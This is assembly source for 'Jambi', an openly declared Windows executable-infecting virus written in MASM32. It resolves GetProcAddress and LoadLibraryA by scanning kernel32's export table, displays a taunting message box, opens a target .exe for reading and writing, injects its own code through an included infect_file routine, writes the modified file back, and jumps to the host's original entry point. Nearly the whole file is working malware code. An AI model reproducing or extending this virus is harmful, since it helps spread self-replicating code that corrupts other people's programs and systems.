; Jambi
; MASM32 asm program for Intel i386 processors running Windows 32bits
; By Deb0ch.

.386
.model flat, stdcall
option casemap:none

.code

begin_copy:

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; DATA (inside .code section)
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

    oldEntryPoint           dd end_copy
    msgOfVictory            db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0

    kernel32_dll_name       db "Kernel32.dll", 0
    user32_dll_name         db "User32.dll", 0
    getProcAddress_name     db "GetProcAddress", 0
    loadLibrary_name        db "LoadLibraryA", 0

	file_name				db ".\test.exe", 0

	dbg_sysfail				db "A system function failed", 0	; DEBUG
	dbg_infectfail			db "Problem with an exe file", 0	; DEBUG

; Function names
	closehandle_name		db "CloseHandle", 0
	createfile_name			db "CreateFileA", 0
	findfirstfile_name		db "FindFirstFileA", 0
	findnextfile_name		db "FindNextFileA", 0
	getfilesize_name		db "GetFileSize", 0
    messagebox_name         db "MessageBoxA", 0
	readfile_name			db "ReadFile", 0
	setfilepointer_name		db "SetFilePointer", 0
    virtualalloc_name       db "VirtualAlloc", 0
	writefile_name			db "WriteFile", 0

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; DATA (inside .code section) - END
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤



; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; PROCEDURES
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

include		utils.asm
include		infect_file.asm

; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; PROCEDURES - END
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤


; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
; eax: reserved for proc and func return values.
; ebx: delta offset
; esi: Keep track of where we need to be in the kernel32.dll.
; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

start: ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** 

    mov     esi, [esp]                  ; Look for last eip which was in kernel32.dll, and is now on the stack.

    call    delta_offset				; Get delta offset for position independence.
delta_offset:
    pop     ebx
    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.

main PROC NEAR

    LOCAL   getProcAddress_addr:DWORD
	LOCAL	loadLibrary_addr:DWORD
	LOCAL	imageBase:DWORD
	LOCAL	filehandle:DWORD
	LOCAL	fileptr:DWORD
	LOCAL	filesize:DWORD

; Function addresses
	LOCAL	closehandle_addr:DWORD
	LOCAL	createfile_addr:DWORD
	LOCAL	findfirstfile_addr:DWORD
	LOCAL	findnextfile_addr:DWORD
	LOCAL	getfilesize_addr:DWORD
	LOCAL	messagebox_addr:DWORD
	LOCAL	readfile_addr:DWORD
	LOCAL	setfilepointer_addr:DWORD
	LOCAL	virtualalloc_addr:DWORD
	LOCAL	writefile_addr:DWORD

    and     esi, 0FFFF0000h             ; mask address inside k32.dll to get page aligned like sections.

search_k32:
    sub     esi, 1000h                  ; Going back and back, keeping the page/section alignment.
    cmp     word ptr [esi], "ZM"        ; Looking for the "MZ" signature of a DOS header. "ZM" for endianess.
    jne     search_k32

    mov     imageBase, esi              ; imageBase = Real BaseAdress (for sure).

    add     esi, [esi + 3Ch]            ; esi -> IMAGE_NT_HEADERS
    cmp     word ptr [esi], "EP"
    jne     exit

    add     esi, 18h                    ; esi -> IMAGE_OPTIONAL_HEADER

    cmp     word ptr [esi], 10bh        ; 10bh = IMAGE_OPTIONAL_HEADER magic number for 32bits programs
    jne     exit

    add     esi, 60h                    ; esi -> DataDirectory[0] (=> export_table)
    mov     esi, dword ptr [esi]        ; esi -> export_table (type IMAGE_EXPORT_DIRECTORY) (RVA)

    add     esi, imageBase              ; esi -> export table directory (type IMAGE_EXPORT_DIRECTORY) (VA)

; --------------------------------------> Now, we want to find our function's string symbol and get its index in the export name pointer table.

    mov     edx, [esi + 20h]            ; edx -> export name pointer table (RVA)
    add     edx, imageBase              ; edx -> export name pointer table (VA)

    push    edx                         ; save edx for next function to be found (LoadLibrary).
    push    esi                                         ; Save esi and
    lea     esi, [ebx + offset getProcAddress_name]     ; use it for storing the reference name.
    xor     ecx, ecx                    ; ecx = counter. Will contain the symbol's offset in the array.

browse_export_names:
    mov     edi, [edx + ecx]            ; edi -> symbol string name (RVA)
    add     edi, imageBase              ; edi -> symbol string name (VA)
    add     ecx, sizeof dword           ; edx -> next symbol (VA)

    call    my_strcmp                   ; strcmp between edi and esi.
    cmp     eax, 0
    jne     browse_export_names         ; eax == 0 means that match was found, we can exit the loop.


    pop     esi                         ; esi -> export_table (type IMAGE_EXPORT_DIRECTORY) (VA).

    mov     edx, [esi + 1ch]            ; edx -> export adress table (RVA)
    add     edx, ecx                    ; edx -> address of previously found function's RVA. (RVA)
    add     edx, imageBase              ; edx -> address of previously found function's RVA. (VA)

    mov     edx, [edx]                  ; edx == address of previously found function (RVA)
    add     edx, imageBase              ; edx == address of previously found function (VA)
    mov     getProcAddress_addr , edx

; --------------------------------------> GetProcAddress's VA is now saved in getProcAddress_addr. Yay !!!
; --------------------------------------> Now let's find LoadLibrary's address !

    pop     edx                         ; edx -> export name pointer table (VA)

    push    esi                                     ; Save esi and
    lea     esi, [ebx + offset loadLibrary_name]    ; use it for storing the reference name.
    xor     ecx, ecx                                ; ecx = counter. Will contain the symbol's offset in the array.

browse_export_names2:
    mov     edi, [edx + ecx]            ; edi -> symbol string name (RVA)
    add     edi, imageBase              ; edi -> symbol string name (VA)
    add     ecx, sizeof dword           ; edx -> next symbol (VA)

    call    my_strcmp                   ; strcmp between edi and esi.
    cmp     eax, 0
    jne     browse_export_names2        ; eax == 0 means that match was found, we can exit the loop.


    pop     esi                         ; esi -> export_table (type IMAGE_EXPORT_DIRECTORY) (VA).

    mov     edx, [esi + 1ch]            ; edx -> export adress table (RVA)
    sub     ecx, 4                      ; WHAAAAAAAAAAT ?????? What the hell is that offset !?!?!?!?!?!?!?!?
    add     edx, ecx                    ; edx -> address of previously found function's RVA. (RVA)
    add     edx, imageBase              ; edx -> address of previously found function's RVA. (VA)

    mov     edx, [edx]                  ; edx == address of previously found function (RVA)
    add     edx, imageBase              ; edx == address of previously found function (VA)
    mov     loadLibrary_addr, edx

; --------------------------------------> LoadLibrary's VA is now saved in getProcAddress_addr. Yay !!!
; --------------------------------------> Now we can use these functions to load any function from any dll on the system. Yay =D

; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
; Can be used ONLY within this procedure.
LOADFUNC	MACRO	fct_name, dll_name, result_container
    lea     edx, [ebx + offset dll_name]		    ;
    push    edx                                     ;
    call    loadLibrary_addr                        ;
    lea     edx, [ebx + offset fct_name]     		;
    push    edx                                     ;
    push    eax                                     ;
    call    getProcAddress_addr                     ;
    mov     result_container, eax                   ; Sequence of instructions to load a function from a dll.
ENDM

; Load your functions here.
	
	LOADFUNC	closehandle_name,	kernel32_dll_name,	closehandle_addr
	LOADFUNC	createfile_name,	kernel32_dll_name,	createfile_addr
	LOADFUNC	findfirstfile_name,	kernel32_dll_name,	findfirstfile_addr
	LOADFUNC	findnextfile_name,	kernel32_dll_name,	findnextfile_addr
	LOADFUNC	getfilesize_name,	kernel32_dll_name,	getfilesize_addr
	LOADFUNC	messagebox_name,	user32_dll_name,	messagebox_addr
	LOADFUNC	readfile_name,		kernel32_dll_name,	readfile_addr
	LOADFUNC	setfilepointer_name,kernel32_dll_name,	setfilepointer_addr
	LOADFUNC	virtualalloc_name,	kernel32_dll_name,	virtualalloc_addr
	LOADFUNC	writefile_name,		kernel32_dll_name,	writefile_addr

; functions loading end.

    push    0                           			;
	lea		ecx, [ebx + offset msgOfVictory]		;
    push    ecx										;
    push    ecx         							;
    push    0                           			;
    call    messagebox_addr             			; Msgbox of VICTORY !!!

; --------------------------------------> Now, time to infect the other files ! Niark niark niark...

	push	0							; No template file
	push	80h							; FILE_ATTRIBUTES_NORMAL
	push 	3							; ONLY_EXISTING (only if it exists)
	push	0							; no security
	push	0							; no sharing
	push	0c0000000h					; GENERIC_READ | GENERIC_WRITE
	lea		ecx, [ebx + offset file_name]
	push	ecx							;
	call	createfile_addr				; CreateFile()
	mov		filehandle, eax
	cmp		filehandle, -1
	je		syserr
	
	push	0
	push	filehandle
	call	getfilesize_addr			; GetFileFize()
	mov		filesize, eax
	cmp		eax, -1
	je		syserr

	add		eax, 5000h					; TODO: calculate size to allocate more properly.

	push    04h							; read/write permissions
	push    00001000h					; MEM_COMMIT
	push    eax							; size to allocate
	push    0							; address. NULL == we want a new address
	call    virtualalloc_addr			; VirtualAlloc()
	mov     fileptr, eax
	cmp		eax, 0
	je		syserr

	push	0
	lea		ecx, [esp - 4]
	push	ecx
	push	filesize
	push	fileptr
	push	filehandle
	call	readfile_addr				; ReadFile(). Read all the file and put it in our buffer.
	cmp		eax, 0
	je		syserr

; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !

	invoke	infect_file, fileptr		; Procedure to properly inject our code into the file of interest.

	cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
	jne		infect_dbg							; DEBUG
	push	0									; DEBUG
	lea		ecx, [ebx + offset dbg_infectfail]	; DEBUG
	push	ecx									; DEBUG
	push	ecx									; DEBUG
	push	0									; DEBUG
	call	messagebox_addr						; DEBUG
infect_dbg:										; DEBUG

	push	0							; 0 = from beginning of the file
	push	0							; 0 = no high order DWORD for size to move
	push	0							; size to move
	push	filehandle
	call	setfilepointer_addr			; Move back to the beginning of the file
	cmp		eax, -1
	je		syserr

	push	0
	lea		ecx, [esp - 4]
	push	ecx
	mov		ecx, filesize
	add		ecx, 5000h					; TODO: calculate size more properly
	push	ecx
	push	fileptr
	push	filehandle
	call	writefile_addr				; Write the buffer back to the file.

	push	filehandle
	call	closehandle_addr			; We close the file because we are not pigs.

	jmp		exit_search_exe
syserr:
	push	0									; DEBUG
	lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
	push	ecx									; DEBUG
	push	ecx									; DEBUG
	push	0									; DEBUG
	call	messagebox_addr						; DEBUG

exit_search_exe:

	jmp		search_exe

	mov		ecx, [ebx + oldEntryPoint]
	leave
	jmp		ecx							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.

    ret
main ENDP

end_copy:
	ret
end start
